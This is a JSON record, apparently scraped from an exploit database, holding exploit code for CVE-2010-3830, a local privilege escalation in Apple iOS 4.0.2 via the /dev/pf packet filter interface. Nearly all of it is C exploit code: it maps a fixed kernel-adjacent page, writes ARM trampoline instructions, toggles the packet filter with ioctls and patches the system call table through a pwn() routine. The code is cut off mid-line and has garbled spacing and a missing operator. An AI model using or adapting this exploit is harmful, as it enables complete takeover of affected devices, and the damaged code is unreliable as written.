{
    "text": "ecve : CVE-2010-3830 ， title : Apple iOS 4.0.2 - Networking Packet Filter Rules Privilege Escalation - iOS local Exploit ， verified : Verified ， exploit_detail : // source :  ， // Apple iOS is prone to a local privilege-escalation vulnerability. ， // Local attackers running malicious code can exploit this issue to elevate their privileges. Successful attacks will completely compromise an affected device. ， int main (  ) { ， unsigned int target_addr = CONFIG_TARGET_ADDR ;  ， unsigned int target_addr_real = target_addr & ~ 1 ;  ， unsigned int target_pagebase = target_addr & ~ 0xfff ;  ， unsigned int num_decs = ( CONFIG_SYSENT_PATCH_ORIG - target_addr ) 24 ;  ， assert ( MAP_FAILED ! = mmap (  ( void *  ) target_pagebase , 0x2000 , PROT_READ | PROT_WRITE , MAP_ANON | MAP_PRIVATE | MAP_FIXED , -1 , 0 )  )  ;  ， unsigned short * p = ( void *  ) target_addr_real ;  ，  * p++ = 0x4b00 ; // ldr r3 ,  [ pc ]  ，  * p++ = 0x4718 ; // bx r3 ，  *  (  ( unsigned int *  ) p ) = ( unsigned int ) &ok_go ;  ， assert (  ! mprotect (  ( void *  ) target_pagebase , 0x2000 , PROT_READ | PROT_EXEC )  )  ;  ， // Yes , reopening is necessary ， pffd = open ( \"/dev/pf\" , O_RDWR )  ;  ， ioctl ( pffd , DIOCSTOP )  ;  ， assert (  ! ioctl ( pffd , DIOCSTART )  )  ;  ， unsigned int sysent_patch = CONFIG_SYSENT_PATCH ;  ， pwn ( sysent_patch+3 )  ;  ， assert (  ! ioctl ( pffd , DIOCSTOP )  )  ;  ， close ( pffd )  ;  ， assert (  ! mlock (  ( void *  )  (  ( unsigned int )  ( &ok_go ) & ~ 0xfff )  , 0x1000 )  )  ;  ， assert (  ! mlock (  ( void *  )  (  ( unsigned int )  ( &flush ) & ~ 0xfff )  , 0x1000 )  )  ;  ， assert (  ! mlock (  ( void *  ) target_pagebase , 0x2000 )  )  ;  ，  # if",
    "time": "2010-11-22"
}